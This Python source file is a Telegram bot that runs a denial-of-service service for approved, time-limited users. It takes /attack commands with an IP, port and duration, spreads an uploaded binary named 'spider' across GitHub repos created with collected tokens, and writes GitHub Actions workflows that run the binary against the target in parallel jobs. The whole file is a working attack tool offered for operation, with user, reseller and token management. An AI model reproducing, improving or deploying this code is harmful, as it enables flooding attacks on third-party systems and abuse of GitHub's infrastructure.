"""
RAILWAY OPTIMIZED - WORKING VERSION
"""

import os
import sys
import json
import logging
import threading
import time
import uuid
import random
import string
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== CRITICAL: Fix for Railway ====================
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import (
        Application, CommandHandler, ContextTypes, 
        MessageHandler, filters, ConversationHandler,
        CallbackQueryHandler
    )
except ImportError as e:
    print(f"❌ Import Error: {e}")
    print("🔄 Installing missing dependencies...")
    os.system("pip install --no-cache-dir python-telegram-bot")
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import (
        Application, CommandHandler, ContextTypes, 
        MessageHandler, filters, ConversationHandler,
        CallbackQueryHandler
    )

from github import Github, GithubException
from dotenv import load_dotenv
import aiohttp
import ujson as json

# ==================== LOAD ENV ====================
load_dotenv()

# ==================== CONFIG ====================
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set! Please set in Railway variables.")
    sys.exit(1)

ADMIN_IDS = list(map(int, os.getenv("ADMIN_IDS", "7971134405").split(",")))
MAX_WORKERS = int(os.getenv("MAX_WORKERS", "30"))
ATTACK_TIMEOUT = int(os.getenv("ATTACK_TIMEOUT", "3600"))
COOLDOWN_DEFAULT = int(os.getenv("COOLDOWN_DEFAULT", "40"))
MAX_ATTACKS_DEFAULT = int(os.getenv("MAX_ATTACKS_DEFAULT", "100"))

# ==================== DATA DIRECTORY ====================
DATA_DIR = os.getenv("RAILWAY_DATA_DIR", "/app/data") if os.getenv("RAILWAY") else "data"
os.makedirs(DATA_DIR, exist_ok=True)

print(f"📁 Data directory: {DATA_DIR}")

# ==================== DATA MANAGER ====================
class DataManager:
    @classmethod
    def _get_path(cls, filename):
        return os.path.join(DATA_DIR, filename)
    
    @classmethod
    def load_json(cls, filename, default=None):
        path = cls._get_path(filename)
        if os.path.exists(path):
            try:
                with open(path, 'r') as f:
                    return json.load(f)
            except:
                return default or {}
        return default or {}
    
    @classmethod
    def save_json(cls, filename, data):
        path = cls._get_path(filename)
        with open(path, 'w') as f:
            json.dump(data, f, indent=2)
    
    @classmethod
    def load_owners(cls): return cls.load_json('owners.json', {})
    @classmethod
    def save_owners(cls, data): cls.save_json('owners.json', data)
    
    @classmethod
    def load_approved(cls): return cls.load_json('approved_users.json', {})
    @classmethod
    def save_approved(cls, data): cls.save_json('approved_users.json', data)
    
    @classmethod
    def load_tokens(cls): return cls.load_json('github_tokens.json', [])
    @classmethod
    def save_tokens(cls, data): cls.save_json('github_tokens.json', data)
    
    @classmethod
    def load_attack_history(cls): return cls.load_json('attack_history.json', [])
    @classmethod
    def save_attack_history(cls, data): cls.save_json('attack_history.json', data)
    
    @classmethod
    def load_pending(cls): return cls.load_json('pending_users.json', [])
    @classmethod
    def save_pending(cls, data): cls.save_json('pending_users.json', data)
    
    @classmethod
    def load_admins(cls): return cls.load_json('admins.json', {})
    @classmethod
    def save_admins(cls, data): cls.save_json('admins.json', data)
    
    @classmethod
    def load_resellers(cls): return cls.load_json('resellers.json', {})
    @classmethod
    def save_resellers(cls, data): cls.save_json('resellers.json', data)

# ==================== GITHUB MANAGER ====================
class GitHubManager:
    def __init__(self, tokens: List[Dict]):
        self.tokens = tokens
        self.token_index = 0
        self.repo_names = [
            "spider", "thor", "antman", "catwoman", "batman", "ironman",
            "superman", "flash", "hulk", "loki", "deadpool", "wolverine",
            "venom", "thanos", "drstrange", "blackpanther", "captainamerica",
            "hawkeye", "falcon", "vision", "aquaman", "cyborg", "greenlantern"
        ]
        self.used_repos = set()
        self.lock = threading.Lock()
    
    def get_random_repo_name(self) -> str:
        available = [r for r in self.repo_names if r not in self.used_repos]
        if not available:
            self.used_repos.clear()
            available = self.repo_names
        name = random.choice(available)
        self.used_repos.add(name)
        return f"{name}-{uuid.uuid4().hex[:8]}"
    
    def create_repo(self, token: str, repo_name: str) -> Tuple[bool, str]:
        try:
            g = Github(token)
            user = g.get_user()
            try:
                repo = user.get_repo(repo_name)
                return True, f"{user.login}/{repo_name}"
            except:
                repo = user.create_repo(repo_name, description="Attack Bot", private=False, auto_init=True)
                return True, f"{user.login}/{repo_name}"
        except Exception as e:
            return False, str(e)
    
    def update_file(self, token: str, repo_name: str, binary_content: bytes) -> bool:
        try:
            g = Github(token)
            repo = g.get_repo(repo_name)
            try:
                existing = repo.get_contents("spider")
                repo.update_file("spider", "Update binary", binary_content, existing.sha)
            except:
                repo.create_file("spider", "Upload binary", binary_content)
            return True
        except:
            return False
    
    def start_workflow(self, token: str, repo_name: str, target) -> bool:
        try:
            g = Github(token)
            repo = g.get_repo(repo_name)
            yml_content = f"""name: Attack
on: [push]
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x spider
    - run: sudo ./spider {target.ip} {target.port} {target.duration} 350
"""
            try:
                existing = repo.get_contents(".github/workflows/main.yml")
                repo.update_file(".github/workflows/main.yml", f"Attack {target.ip}", yml_content, existing.sha)
            except:
                repo.create_file(".github/workflows/main.yml", f"Attack {target.ip}", yml_content)
            return True
        except:
            return False
    
    def stop_workflows(self, token: str, repo_name: str) -> int:
        try:
            g = Github(token)
            repo = g.get_repo(repo_name)
            cancelled = 0
            for status in ['queued', 'in_progress', 'pending']:
                for workflow in repo.get_workflow_runs(status=status):
                    try:
                        workflow.cancel()
                        cancelled += 1
                    except:
                        pass
            return cancelled
        except:
            return 0

# ==================== DATA CLASSES ====================
@dataclass
class AttackTarget:
    ip: str
    port: int
    duration: int
    method: str = "UDP"
    user_id: int = 0

@dataclass
class AttackStatus:
    target: AttackTarget
    started_at: float
    estimated_end: float
    repos_used: int = 0
    repos_success: int = 0
    repos_failed: int = 0
    status: str = "running"
    
    @property
    def elapsed(self) -> int:
        return int(time.time() - self.started_at)
    
    @property
    def remaining(self) -> int:
        return max(0, int(self.estimated_end - time.time()))

# ==================== ATTACK ENGINE ====================
class AttackEngine:
    def __init__(self, github_manager: GitHubManager):
        self.github = github_manager
        self.current_attack: Optional[AttackStatus] = None
        self.cooldown_until: float = 0
        self.lock = threading.Lock()
        self.executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
        self.binary_content: Optional[bytes] = None
        self.is_binary_uploaded = False
    
    def set_binary(self, content: bytes):
        self.binary_content = content
        self.is_binary_uploaded = True
    
    def can_start_attack(self, user_id: int) -> Tuple[bool, str]:
        with self.lock:
            if time.time() < self.cooldown_until:
                remaining = int(self.cooldown_until - time.time())
                return False, f"⏳ Cooldown: {remaining}s remaining"
            if self.current_attack and self.current_attack.status == "running":
                return False, "⚡ Attack already running!"
            return True, "Ready"
    
    def start_attack(self, target: AttackTarget) -> AttackStatus:
        with self.lock:
            status = AttackStatus(
                target=target,
                started_at=time.time(),
                estimated_end=time.time() + target.duration,
                repos_used=len(self.github.tokens)
            )
            self.current_attack = status
            threading.Thread(target=self._execute_attack, args=(target, status), daemon=True).start()
            return status
    
    def _execute_attack(self, target: AttackTarget, status: AttackStatus):
        try:
            tokens = self.github.tokens.copy()
            if not tokens:
                status.status = "failed"
                return
            
            success_count = 0
            fail_count = 0
            
            with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(tokens))) as executor:
                futures = []
                for token_data in tokens:
                    repo_name = token_data.get('repo')
                    if not repo_name:
                        repo_name = self.github.get_random_repo_name()
                        created, repo_name = self.github.create_repo(token_data['token'], repo_name)
                    futures.append(executor.submit(
                        self.github.start_workflow,
                        token_data['token'],
                        repo_name,
                        target
                    ))
                
                for future in as_completed(futures):
                    if future.result():
                        success_count += 1
                    else:
                        fail_count += 1
            
            status.repos_success = success_count
            status.repos_failed = fail_count
            status.status = "completed" if success_count > 0 else "failed"
            
            with self.lock:
                self.cooldown_until = time.time() + COOLDOWN_DEFAULT
                
        except Exception as e:
            status.status = "failed"
    
    def stop_attack(self) -> int:
        with self.lock:
            if not self.current_attack:
                return 0
            total_stopped = 0
            with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(self.github.tokens))) as executor:
                futures = []
                for token_data in self.github.tokens:
                    futures.append(executor.submit(
                        self.github.stop_workflows,
                        token_data['token'],
                        token_data.get('repo')
                    ))
                for future in as_completed(futures):
                    try:
                        total_stopped += future.result(timeout=10)
                    except:
                        pass
            self.current_attack.status = "stopped"
            return total_stopped

# ==================== BOT HANDLER ====================
class BotHandler:
    def __init__(self, engine: AttackEngine, github_manager: GitHubManager):
        self.engine = engine
        self.github = github_manager
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        username = update.effective_user.username or str(user_id)
        
        owners = DataManager.load_owners()
        approved = DataManager.load_approved()
        
        if str(user_id) in owners or str(user_id) in approved:
            await update.message.reply_text(
                f"🔥 **SUPER BOT ACTIVATED** 🔥\n\n"
                f"👤 User: @{username}\n"
                f"🆔 ID: `{user_id}`\n"
                f"✅ Status: Authorized\n\n"
                f"**Commands:**\n"
                f"• /attack <ip> <port> <duration>\n"
                f"• /status - Check status\n"
                f"• /stop - Stop attack\n"
                f"• /myaccess - View access\n"
                f"• /help - Help menu"
            )
        else:
            pending = DataManager.load_pending()
            if str(user_id) not in [str(u.get('user_id')) for u in pending]:
                pending.append({'user_id': user_id, 'username': username, 'requested_at': time.time()})
                DataManager.save_pending(pending)
                
                for owner_id in owners.keys():
                    try:
                        await context.bot.send_message(
                            chat_id=int(owner_id),
                            text=f"📥 **New Request**\n👤 @{username}\n🆔 `{user_id}`\nUse /add {user_id} <days>"
                        )
                    except:
                        pass
            
            await update.message.reply_text(
                f"⏳ **Access Pending**\n\n"
                f"Your request has been sent.\n"
                f"🆔 ID: `{user_id}`\n\n"
                f"Wait for approval."
            )
    
    async def attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        args = context.args
        
        if len(args) < 3:
            await update.message.reply_text("❌ Usage: /attack <ip> <port> <duration>")
            return
        
        owners = DataManager.load_owners()
        approved = DataManager.load_approved()
        if str(user_id) not in owners and str(user_id) not in approved:
            await update.message.reply_text("❌ Unauthorized")
            return
        
        try:
            ip = args[0]
            port = int(args[1])
            duration = int(args[2])
            
            if duration > ATTACK_TIMEOUT:
                await update.message.reply_text(f"⚠️ Max duration: {ATTACK_TIMEOUT}s")
                return
            
            target = AttackTarget(ip=ip, port=port, duration=duration, user_id=user_id)
            
            can_start, msg = self.engine.can_start_attack(user_id)
            if not can_start:
                await update.message.reply_text(msg)
                return
            
            status = self.engine.start_attack(target)
            
            await update.message.reply_text(
                f"🚀 **Attack Started!**\n\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"⏱ Duration: {duration}s\n"
                f"📦 Repos: {len(self.github.tokens)} active\n"
                f"⏳ ETA: {duration}s\n\n"
                f"Use /status for updates"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
    
    async def status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        status = self.engine.current_attack
        
        if not status or status.status != "running":
            if time.time() < self.engine.cooldown_until:
                remaining = int(self.engine.cooldown_until - time.time())
                await update.message.reply_text(f"⏳ Cooldown: {remaining}s remaining")
            else:
                await update.message.reply_text("✅ No active attack")
            return
        
        progress = 1 - (status.remaining / status.target.duration)
        bar_length = 20
        filled = int(bar_length * progress)
        bar = "█" * filled + "░" * (bar_length - filled)
        
        await update.message.reply_text(
            f"⚡ **Attack Status**\n"
            f"{'='*20}\n\n"
            f"🎯 Target: `{status.target.ip}:{status.target.port}`\n"
            f"⏱ Elapsed: {status.elapsed}s / {status.target.duration}s\n"
            f"📊 Progress: {bar} {int(progress*100)}%\n"
            f"📦 Success: {status.repos_success}\n"
            f"❌ Failed: {status.repos_failed}\n"
            f"⏳ Remaining: {status.remaining}s"
        )
    
    async def stop(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.engine.current_attack:
            await update.message.reply_text("❌ No active attack")
            return
        
        stopped = self.engine.stop_attack()
        await update.message.reply_text(f"⏹ **Stopped**\n✅ {stopped} workflows cancelled")
    
    async def myaccess(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        owners = DataManager.load_owners()
        approved = DataManager.load_approved()
        
        if str(user_id) in owners:
            role = "👑 Owner"
            expiry = "Lifetime"
        elif str(user_id) in approved:
            role = "✅ User"
            user_data = approved.get(str(user_id), {})
            expiry = user_data.get('expiry', 'Unknown')
        else:
            role = "⏳ Pending"
            expiry = "N/A"
        
        await update.message.reply_text(
            f"📋 **Your Access**\n"
            f"{'='*20}\n\n"
            f"🆔 ID: `{user_id}`\n"
            f"👤 Role: {role}\n"
            f"⏳ Expiry: {expiry}\n"
            f"⚡ Workers: {MAX_WORKERS}"
        )
    
    async def help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            f"📖 **Commands**\n"
            f"{'='*20}\n\n"
            f"• /start - Start bot\n"
            f"• /attack <ip> <port> <duration> - Start attack\n"
            f"• /status - Check status\n"
            f"• /stop - Stop attack\n"
            f"• /myaccess - View access\n"
            f"• /help - This menu\n\n"
            f"**Admin Commands:**\n"
            f"• /add <user_id> <days> - Add user\n"
            f"• /remove <user_id> - Remove user\n"
            f"• /userslist - List users\n"
            f"• /addtoken <token> - Add GitHub token\n"
            f"• /tokens - List tokens\n"
            f"• /removetoken <index> - Remove token\n"
            f"• /binary_upload - Upload binary"
        )
    
    async def add(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        owners = DataManager.load_owners()
        
        if str(user_id) not in owners:
            await update.message.reply_text("❌ Only owners can use this")
            return
        
        args = context.args
        if len(args) < 2:
            await update.message.reply_text("Usage: /add <user_id> <days>")
            return
        
        try:
            new_user = int(args[0])
            days = int(args[1])
            
            approved = DataManager.load_approved()
            approved[str(new_user)] = {
                'added_by': user_id,
                'added_at': time.time(),
                'expiry': time.time() + (days * 86400) if days > 0 else 'Lifetime',
                'days': days
            }
            DataManager.save_approved(approved)
            
            await update.message.reply_text(f"✅ User `{new_user}` added for {days} days")
            
            try:
                await context.bot.send_message(
                    chat_id=new_user,
                    text=f"🎉 **Access Approved!**\nYou have {days} days access.\nUse /start"
                )
            except:
                pass
        except:
            await update.message.reply_text("❌ Invalid input")
    
    async def remove(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        owners = DataManager.load_owners()
        
        if str(user_id) not in owners:
            await update.message.reply_text("❌ Unauthorized")
            return
        
        if len(context.args) < 1:
            await update.message.reply_text("Usage: /remove <user_id>")
            return
        
        try:
            user_to_remove = int(context.args[0])
            approved = DataManager.load_approved()
            if str(user_to_remove) in approved:
                del approved[str(user_to_remove)]
                DataManager.save_approved(approved)
                await update.message.reply_text(f"✅ User `{user_to_remove}` removed")
            else:
                await update.message.reply_text("❌ User not found")
        except:
            await update.message.reply_text("❌ Invalid input")
    
    async def userslist(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        owners = DataManager.load_owners()
        
        if str(user_id) not in owners:
            await update.message.reply_text("❌ Unauthorized")
            return
        
        approved = DataManager.load_approved()
        if not approved:
            await update.message.reply_text("📭 No users found")
            return
        
        msg = "👥 **Users**\n" + "="*20 + "\n"
        for uid, data in approved.items():
            exp = data.get('expiry', '?')
            if exp != 'Lifetime':
                try:
                    days_left = int((float(exp) - time.time()) / 86400)
                    exp = f"{days_left}d"
                except:
                    pass
            msg += f"🆔 `{uid}` - {exp}\n"
        
        msg += f"\n📊 Total: {len(approved)}"
        await update.message.reply_text(msg)
    
    async def addtoken(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        owners = DataManager.load_owners()
        
        if str(user_id) not in owners:
            await update.message.reply_text("❌ Unauthorized")
            return
        
        if len(context.args) < 1:
            await update.message.reply_text("Usage: /addtoken <github_token>")
            return
        
        token = context.args[0]
        
        try:
            g = Github(token)
            user = g.get_user()
            
            tokens = DataManager.load_tokens()
            for t in tokens:
                if t.get('token') == token:
                    await update.message.reply_text("❌ Token already exists")
                    return
            
            tokens.append({'token': token, 'username': user.login, 'added_at': time.time()})
            DataManager.save_tokens(tokens)
            self.github.tokens = tokens
            
            await update.message.reply_text(f"✅ Token added for @{user.login}\n📊 Total: {len(tokens)}")
        except Exception as e:
            await update.message.reply_text(f"❌ Invalid token: {str(e)}")
    
    async def tokens(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        owners = DataManager.load_owners()
        
        if str(user_id) not in owners:
            await update.message.reply_text("❌ Unauthorized")
            return
        
        tokens = DataManager.load_tokens()
        if not tokens:
            await update.message.reply_text("📭 No tokens found")
            return
        
        msg = "🔑 **Tokens**\n" + "="*20 + "\n"
        for i, t in enumerate(tokens, 1):
            msg += f"{i}. @{t.get('username', 'unknown')} - `{t.get('token', '')[:10]}...`\n"
        
        await update.message.reply_text(msg)
    
    async def removetoken(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        owners = DataManager.load_owners()
        
        if str(user_id) not in owners:
            await update.message.reply_text("❌ Unauthorized")
            return
        
        if len(context.args) < 1:
            await update.message.reply_text("Usage: /removetoken <index>")
            return
        
        try:
            index = int(context.args[0]) - 1
            tokens = DataManager.load_tokens()
            if 0 <= index < len(tokens):
                removed = tokens.pop(index)
                DataManager.save_tokens(tokens)
                self.github.tokens = tokens
                await update.message.reply_text(f"✅ Removed @{removed.get('username', 'unknown')}")
            else:
                await update.message.reply_text("❌ Invalid index")
        except:
            await update.message.reply_text("❌ Invalid input")
    
    async def binary_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        owners = DataManager.load_owners()
        
        if str(user_id) not in owners:
            await update.message.reply_text("❌ Unauthorized")
            return
        
        await update.message.reply_text("📤 Send the binary file now. Use /cancel to cancel.")
        return 1
    
    async def handle_binary(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not update.message.document:
            await update.message.reply_text("❌ Please send a file")
            return 1
        
        try:
            file = await update.message.document.get_file()
            file_path = f"temp_binary_{update.effective_user.id}.bin"
            await file.download_to_drive(file_path)
            
            with open(file_path, 'rb') as f:
                content = f.read()
            
            self.engine.set_binary(content)
            
            tokens = DataManager.load_tokens()
            success = 0
            fail = 0
            
            msg = await update.message.reply_text(f"📤 Uploading to {len(tokens)} repos...")
            
            with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(tokens))) as executor:
                futures = []
                for token_data in tokens:
                    repo_name = token_data.get('repo')
                    if not repo_name:
                        repo_name = self.github.get_random_repo_name()
                        created, repo_name = self.github.create_repo(token_data['token'], repo_name)
                    futures.append(executor.submit(
                        self.github.update_file,
                        token_data['token'],
                        repo_name,
                        content
                    ))
                
                for future in as_completed(futures):
                    if future.result():
                        success += 1
                    else:
                        fail += 1
            
            os.remove(file_path)
            
            await msg.edit_text(
                f"✅ **Upload Complete**\n"
                f"📁 Size: {len(content)} bytes\n"
                f"✅ Success: {success}\n"
                f"❌ Failed: {fail}"
            )
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        
        return ConversationHandler.END
    
    async def cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("❌ Cancelled")
        return ConversationHandler.END

# ==================== MAIN ====================
def main():
    # Load data
    tokens = DataManager.load_tokens()
    github_manager = GitHubManager(tokens)
    engine = AttackEngine(github_manager)
    handler = BotHandler(engine, github_manager)
    
    # Create app
    application = Application.builder().token(BOT_TOKEN).build()
    
    # User commands
    application.add_handler(CommandHandler("start", handler.start))
    application.add_handler(CommandHandler("attack", handler.attack))
    application.add_handler(CommandHandler("status", handler.status))
    application.add_handler(CommandHandler("stop", handler.stop))
    application.add_handler(CommandHandler("myaccess", handler.myaccess))
    application.add_handler(CommandHandler("help", handler.help))
    
    # Admin commands
    application.add_handler(CommandHandler("add", handler.add))
    application.add_handler(CommandHandler("remove", handler.remove))
    application.add_handler(CommandHandler("userslist", handler.userslist))
    application.add_handler(CommandHandler("addtoken", handler.addtoken))
    application.add_handler(CommandHandler("tokens", handler.tokens))
    application.add_handler(CommandHandler("removetoken", handler.removetoken))
    
    # Binary upload
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("binary_upload", handler.binary_upload)],
        states={1: [MessageHandler(filters.Document.ALL, handler.handle_binary)]},
        fallbacks=[CommandHandler("cancel", handler.cancel)]
    )
    application.add_handler(conv_handler)
    
    # Start
    print("🔥 SUPER BOT RUNNING ON RAILWAY")
    print("=" * 40)
    print(f"👥 Owners: {len(DataManager.load_owners())}")
    print(f"👤 Users: {len(DataManager.load_approved())}")
    print(f"🔑 Tokens: {len(DataManager.load_tokens())}")
    print("=" * 40)
    
    application.run_polling()

if __name__ == "__main__":
    main()
